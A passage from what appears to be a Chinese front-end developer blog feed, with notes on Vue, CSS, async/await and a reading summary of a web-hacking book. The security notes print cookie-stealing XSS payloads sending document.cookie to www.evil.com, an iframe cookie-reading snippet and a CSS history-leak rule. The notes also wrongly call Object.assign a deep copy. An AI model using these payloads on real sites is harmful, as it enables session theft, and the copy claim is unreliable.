title="CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为*或者和当前域名一致的话，才会进入第二段的真正请求。"></a>CORS跨域请求会先发option请求，如果server返回access-control-allow-origin头为*或者和当前域名一致的话，才会进入第二段的真正请求。</h3><h3 id="禁止缓存数据deactivated"><a href="#禁止缓存数据deactivated" class="headerlink" title="禁止缓存数据deactivated"></a>禁止缓存数据deactivated</h3><p> 防止下次选择数据不更新<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deactivated () &#123;</span><br><span class="line">  <span class="keyword">this</span>.$destroy(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p> <code>arr.slice()</code><br> 如果obj所有值都是非引用类型，那么obj.slice(0)与深浅拷贝没有差别；</p><p>如果obj有引用类型的元素的话，obj.slice(0)仅仅是复制了元素的地址，，obj.slice(0)可看作浅拷贝。</p><p>对象深拷贝 <code>Object.assign({},obj)</code>,不要用JSON.parse(JSON.stringify(obj)),太慢</p><h3 id="价格标签"><a href="#价格标签" class="headerlink" title="价格标签"></a>价格标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.price-label</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#f15533</span>;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#f15533</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">7.5px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">vertical-align</span>: super;</span><br><span class="line">    &amp;::before&#123;</span><br><span class="line">            <span class="selector-tag">position</span>: <span class="selector-tag">absolute</span>;</span><br><span class="line">            <span class="selector-tag">z-index</span>: 1;</span><br><span class="line">            <span class="selector-tag">content</span>: "";</span><br><span class="line">            <span class="selector-tag">top</span>: 0;</span><br><span class="line">            <span class="selector-tag">right</span>: 0;</span><br><span class="line">            <span class="selector-tag">bottom</span>: 0;</span><br><span class="line">            <span class="selector-tag">left</span>: 0;</span><br><span class="line">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ccc</span>;</span><br><span class="line">            <span class="selector-tag">border-color</span>: <span class="selector-tag">inherit</span>;</span><br><span class="line">            <span class="selector-tag">border-radius</span>: 2<span class="selector-tag">px</span>;</span><br><span class="line">            <span class="selector-tag">transform</span>: <span class="selector-tag">skew</span>(<span class="selector-tag">-11deg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事件冒泡到父容器或某个祖先容器停止"><a href="#事件冒泡到父容器或某个祖先容器停止" class="headerlink" title="事件冒泡到父容器或某个祖先容器停止"></a>事件冒泡到父容器或某个祖先容器停止</h3><p>在父容器或某个祖先容器上绑定一个<a href="mailto:``@click.stop" target="_blank" rel="noopener">``@click.stop</a>=”stop”<code></code><br>stop函数为一个空函数即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;社交分享接口&quot;&gt;&lt;a href=&quot;#社交分享接口&quot; class=&quot;headerlink&quot; title=&quot;社交分享接口&quot;&gt;&lt;/a&gt;社交分享接口&lt;/h3&gt;&lt;p&gt;qzone       : ‘&lt;a href=&quot;http://sns.qzone.qq.com/cgi-bi
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="每月总结" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%AF%8F%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>读《web前端黑客技术揭秘》</title>
    <link href="http://lry1994.github.io/study/2018/6/webSafety.html"/>
    <id>http://lry1994.github.io/study/2018/6/webSafety.html</id>
    <published>2018-05-31T16:00:00.000Z</published>
    <updated>2018-07-02T02:15:40.662Z</updated>
    
    <content type="html"><![CDATA[<p>XSS 跨站脚本攻击<br>如果攻击者构造出如下链接：<br><a href="http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)" target="_blank" rel="noopener">http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</a><br>浏览器解释执行后，下面的语句：<br>eval(location.hash.substr(1));<br>会变为：<br>eval(‘new Image().src=”<a href="http://www.evil.com/steal.php?c=&quot;+escape" target="_blank" rel="noopener">http://www.evil.com/steal.php?c=&quot;+escape</a>(document.<br>cookie)’)<br>Cookies 会话信息就会被盗取到黑客的网站上</p><p>CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”<br>目标权限），然后去做坏事，<br>“盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。</p><p>APT（持久化威胁）攻击<br>如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。</p><p>HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？<br>这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发<br>送出去。Cookies 还可以包括登录认证后的身份信息。</p><p>Content-Type: text/html;charset=gbk<br>响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏<br>览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码<br>方式，同样可能带来安全问题。</p><p>Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030<br>00:00:00 GMT; path=/; domain=.foo.com<br>每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。<br>expires：过期时间，如果过期时间是过去，那就表明这个Cookie 要被删。<br>path：相对路径，只有这个路径下的资源可以访问这个Cookie。<br>domain：域名，不允许设为下一级子域或其他外域，可以指定为父级域<br>HttpOnly：标志（默认无，如果有的话，表明Cookie 存在于HTTP 层面，不能被客户<br>端脚本读取）。<br>Secure：标志（默认无，如果有的话，表明Cookie 仅通过HTTPS 协议进行安全传输）。但是Secure Cookie 对于客户端脚本来说是可读写的。可读意味着<br>Secure Cookie 能被盗取，可写意味着能被篡改。</p><h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>攻击者入侵一个网站后，可以通过iframe 嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行</p><p>当网站页面使用iframe 方式嵌入一个页面时，<br>我们约定网站页面是父页，而被嵌入的这个页面是子页。那么父页与子页之间如何跨文档读写数据？<br>如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow<br>来操作子页的DOM 树，同理，子页可以调用父页的contentWindow 来操作父页的DOM 树。<br>如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location 值进行写操作，<br>这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权<br>限，这样就不能获取到父页location URL 的内容，否则有可能会造成隐私数据泄漏，</p><h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p> <a href="http://www.foo.com（来源域）的AJAX" target="_blank" rel="noopener">www.foo.com（来源域）的AJAX</a> 向<a href="http://www.evil.com（目标域）发起了请求，浏览器会" target="_blank" rel="noopener">www.evil.com（目标域）发起了请求，浏览器会</a><br>给自动带上Origin 头，如下：<br>Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a><br>然后目标域要判断这个Origin 值，如果是自己预期的，那么就返回：<br>Access-Control-Allow-Origin: <a href="http://www.foo.com" target="_blank" rel="noopener">http://www.foo.com</a><br>表示同意跨域</p><p>如果目标域不设置Access-Control-Allow-Origin: <a href="http://www.foo.com，那么隐私数据可" target="_blank" rel="noopener">http://www.foo.com，那么隐私数据可</a><br>以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被<br>目标域的steal.php 接收到了。</p><h3 id="跨域带上会话"><a href="#跨域带上会话" class="headerlink" title="跨域带上会话"></a>跨域带上会话</h3><p>默认情况下，跨域不会带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持），同时目标域的steal.php 必须设置如下：<br>&lt;?php<br>header(“Access-Control-Allow-Origin: <a href="http://www.foo.com&quot;)" target="_blank" rel="noopener">http://www.foo.com&quot;)</a>;<br>header(“Access-Control-Allow-Credentials: true”); // 允许跨域证书发送<br>//…<br>?&gt;<br>有 一 点 需 要 注 意 ， 如 果设置了Access-Control-Allow-Credentials 为true ， 那么<br>Access-Control-Allow-Origin 就不能设置为*通配符</p><h3 id="跨路径读取Cookie"><a href="#跨路径读取Cookie" class="headerlink" title="跨路径读取Cookie"></a>跨路径读取Cookie</h3><p>那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行<br>DOM 操作即可，/evil/路径下页面的代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xc = <span class="function"><span class="keyword">function</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> o = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>); <span class="comment">// iframe 进入同域的目标页面</span></span><br><span class="line">o.src = src;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(o);</span><br><span class="line">o.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">// iframe 加载完成后</span></span><br><span class="line">d = o.contentDocument || o.contentWindow.document;</span><br><span class="line"><span class="comment">// 获取document 对象</span></span><br><span class="line">alert(d.cookie); <span class="comment">// 获取cookie</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;(<span class="string">'http://a.foo.com/admin/index.php'</span>);</span><br></pre></td></tr></table></figure></p><p>所以，通过设置path 不能防止重要的Cookie 被盗取。</p><h3 id="本地Cookie-与内存Cookie"><a href="#本地Cookie-与内存Cookie" class="headerlink" title="本地Cookie 与内存Cookie"></a>本地Cookie 与内存Cookie</h3><p>如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了<br>过期时间是未来的某个时间点，那么这样的Cookie 就会以文本形式保存在操作系统本地，<br>待过期时间到了才会消失。</p><h3 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h3><p>HTTP 响应头的P3P（Platform for Privacy Preferences Project）字段是W3C 公布的一项<br>隐私保护推荐标准。该字段用于标识是否允许目标网站的Cookie 被另一个域通过加载目标<br>网站而设置或发送，仅IE 执行了该策略。<br>比如，evil 域通过script 或iframe 等方式加载foo 域（此时foo 域被称为第三方域）。<br>加载的时候，有两种场景</p><ol><li><p>浏览器是否会允许foo 域设置自己的Cookie</p><p> 在IE 下默认都是不允许第三方域设置域已有的Cookie的，除非foo 域在<code>响应的时候带上P3P 字段</code></p></li><li><p>浏览器是否允许发送请求到foo 域时，带上foo 域已有的Cookie</p><p> 发送的Cookie 如果是内存Cookie，则无所谓是否有P3P 属性，就可以正常发送；如果<br> 是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头<br> 也没用。</p><h3 id="IE的userData"><a href="#IE的userData" class="headerlink" title="IE的userData"></a>IE的userData</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">set_ud</span>(<span class="params">key,value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>); <span class="comment">// x 为任意div 的id 值</span></span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key,value);</span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.load(<span class="string">"db"</span>);</span><br><span class="line">    alert(a.getAttribute(key));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del_ud</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>);</span><br><span class="line">    a.addBehavior(<span class="string">"#default#userdata"</span>);</span><br><span class="line">    a.setAttribute(key, <span class="string">""</span>); <span class="comment">// 设置为空值即可</span></span><br><span class="line">    a.save(<span class="string">"db"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    set_ud(<span class="string">'a'</span>,<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>); <span class="comment">// 设置</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">    del_ud(<span class="string">'a'</span>); <span class="comment">// 删除a 的值</span></span><br><span class="line">    get_ud(<span class="string">'a'</span>); <span class="comment">// 获取a 的值</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h3 id="FlashCookie"><a href="#FlashCookie" class="headerlink" title="FlashCookie"></a>FlashCookie</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_lso</span><span class="params">(k:String=<span class="string">"default"</span>, v:String=<span class="string">""</span>)</span>:void</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 设置值</span></span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    shared.data[k] = v;</span><br><span class="line">    shared.flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_lso</span><span class="params">(k:String=<span class="string">"default"</span>)</span>:String</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 获取值</span></span><br><span class="line">    <span class="keyword">var</span> str:String = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    str = shared.data[k];</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear_lso</span><span class="params">()</span>:void</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 清空值</span></span><br><span class="line">    <span class="keyword">var</span> shared:SharedObject = SharedObject.getLocal(<span class="string">"db"</span>);</span><br><span class="line">    shared.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数劫持很简单"><a href="#函数劫持很简单" class="headerlink" title="函数劫持很简单"></a>函数劫持很简单</h3><p>一般情况下，只要在目标函数触发之前，重写这个函数即可</p><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a2</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://www.evil.com/css/steal.php?data=a2);&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;XSS 跨站脚本攻击&lt;br&gt;如果攻击者构造出如下链接：&lt;br&gt;&lt;a href=&quot;http://www.foo.com/info.html#new%20Image().src=&amp;quot;http://www.evil.com/steal.php?c=&amp;quot;+escap
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="读书笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>2018-6总结</title>
    <link href="http://lry1994.github.io/study/2018/6/suibi.html"/>
    <id>http://lry1994.github.io/study/2018/6/suibi.html</id>
    <published>2018-05-31T16:00:00.000Z</published>
    <updated>2018-08-30T02:32:56.370Z</updated>
    
    <content type="html"><![CDATA[<h3 id="await-async最佳实践"><a href="#await-async最佳实践" class="headerlink" title="await/async最佳实践"></a>await/async最佳实践</h3><h4 id="第一个例子"><a href="#第一个例子" class="headerlink" title="第一个例子"></a>第一个例子</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> pizzaPromise = selectPizza();<span class="comment">//同时执行</span></span><br><span class="line">    <span class="keyword">const</span> drinkPromise = selectDrink();<span class="comment">//同时执行</span></span><br><span class="line">    <span class="keyword">await</span> pizzaPromise;</span><br><span class="line">    <span class="keyword">await</span> drinkPromise;</span><br><span class="line">    orderItems();</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">Promise</span>.all([selectPizza(),selectDrink()]).then()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="第二个例子"><a href="#第二个例子" class="headerlink" title="第二个例子"></a>第二个例子</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    b();</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">c((=&gt;&#123;</span><br><span class="line">    d();</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><p>改写为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="keyword">await</span> a();</span><br><span class="line">    b();</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> ()=&gt;&#123;</span><br><span class="line">    <span class="keyword">await</span> c();</span><br><span class="line">    d();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">ab</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">await</span> a();</span><br><span class="line">    b();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">cd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">await</span> c();</span><br><span class="line">    d();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.all([ab(),cd()]);</span><br></pre></td></tr></table></figure></p><h3 id="使用keep-alive"><a href="#使用keep-alive" class="headerlink" title="使用keep-alive"></a>使用keep-alive</h3><p>在商品列表进入商品详情页之后<br><a href="https://www.cnblogs.com/nokelong/p/8124513.html" target="_blank" rel="noopener">vue中使用keepAlive组件缓存遇到的坑</a></p><h3 id="for循环、while循环、do-while循环比for-in-要快"><a href="#for循环、while循环、do-while循环比for-in-要快" class="headerlink" title="for循环、while循环、do-while循环比for in 要快"></a>for循环、while循环、do-while循环比for in 要快</h3><h3 id="字符串-拼接性能"><a href="#字符串-拼接性能" class="headerlink" title="字符串 拼接性能"></a>字符串 拼接性能</h3><p>比较下四中字符串拼接方法的性能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A：str = str + &apos;a&apos;+&apos;b&apos;</span><br><span class="line">B:str += &apos;a&apos; + &apos;b&apos;</span><br><span class="line">C: arr.join(&apos;&apos;)</span><br><span class="line">D:str.concat(&apos;b&apos;,&apos;c&apos;)</span><br></pre></td></tr></table></figure></p><p>☆ Chrome65上测试的是A优于B优于C优于D</p><h3 id="总结一些常用的"><a href="#总结一些常用的" class="headerlink" title="总结一些常用的"></a>总结一些常用的</h3><ol><li>内容长短不固定的时候用min-height,而不要用height</li><li><p>显示一行，多余的用省略号表示</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.one-line</span>&#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br><span class="line">```     </span><br><span class="line">最多显示2行，多余的用省略号表示</span><br><span class="line">```<span class="selector-tag">css</span></span><br><span class="line"><span class="selector-class">.two-line</span>&#123;     </span><br><span class="line">    <span class="attribute">overflow</span>: hidden;     </span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</span><br><span class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一般英文或者数字是默认不换行，所以要加上</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">word-break</span>: <span class="selector-tag">break-all</span>;</span><br></pre></td></tr></table></figure></li><li><p>placeholder</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:-moz-placeholder</span> &#123; <span class="comment">/* Mozilla Firefox 4 to 18 */</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-pseudo">::-moz-placeholder</span> &#123; <span class="comment">/* Mozilla Firefox 19+ */</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:-ms-input-placeholder</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">::-webkit-input-placeholder</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#C6C6C6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="a标签里面不加download属性会下载下来一些莫名其妙的东西"><a href="#a标签里面不加download属性会下载下来一些莫名其妙的东西" class="headerlink" title="a标签里面不加download属性会下载下来一些莫名其妙的东西"></a>a标签里面不加download属性会下载下来一些莫名其妙的东西</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">"file.worksheetFileId|url"</span>  <span class="attr">:download</span>=<span class="string">"file.fileName"</span>&gt;</span>&#123;&#123;file.fileName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>html5对a标签新增的download属性用于下载文件，简单的理解是a标签如果添加了download属性，那么点击它的时候就不会跳转，而是会触发浏览器下载文件。<br>那么我不加download属性会下载下来的东西是什么？？</p><p>答案：docx后缀的word文档用解压软件打开就是这个目录结构</p><h3 id="nextTick"><a href="#nextTick" class="headerlink" title="$nextTick"></a>$nextTick</h3><p>Vue 实现响应式并不是数据发生变化之后 DOM 立即变化，而是按一定的策略进行 DOM 的更新。<br>$nextTick 是在下次 DOM 更新循环结束之后执行延迟回调，在修改数据之后使用 。</p><h3 id="router-link存在的问题是，手动输入改变url，下面路由没监听到"><a href="#router-link存在的问题是，手动输入改变url，下面路由没监听到" class="headerlink" title="router-link存在的问题是，手动输入改变url，下面路由没监听到"></a>router-link存在的问题是，手动输入改变url，下面路由没监听到</h3><p> vue-router在IE 11下有bug,a href 里的路径，点击地址栏发生了变化，页面并不跳转<br>vm._route.path并没有发生变化，和地址栏不同步<br>要加上这段代码修正下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fixRouterIE</span>(<span class="params">vm</span>)</span>&#123;</span><br><span class="line"><span class="comment">//IE 11下</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">  <span class="string">'-ms-scroll-limit'</span> <span class="keyword">in</span> <span class="built_in">document</span>.documentElement.style &amp;&amp; </span><br><span class="line">  <span class="string">'-ms-ime-align'</span> <span class="keyword">in</span> <span class="built_in">document</span>.documentElement.style</span><br><span class="line">) &#123; </span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">"hashchange"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentPath = <span class="built_in">window</span>.location.hash.slice(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vm._route.path !== currentPath) &#123;</span><br><span class="line">      vm._router.push(currentPath)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="literal">false</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 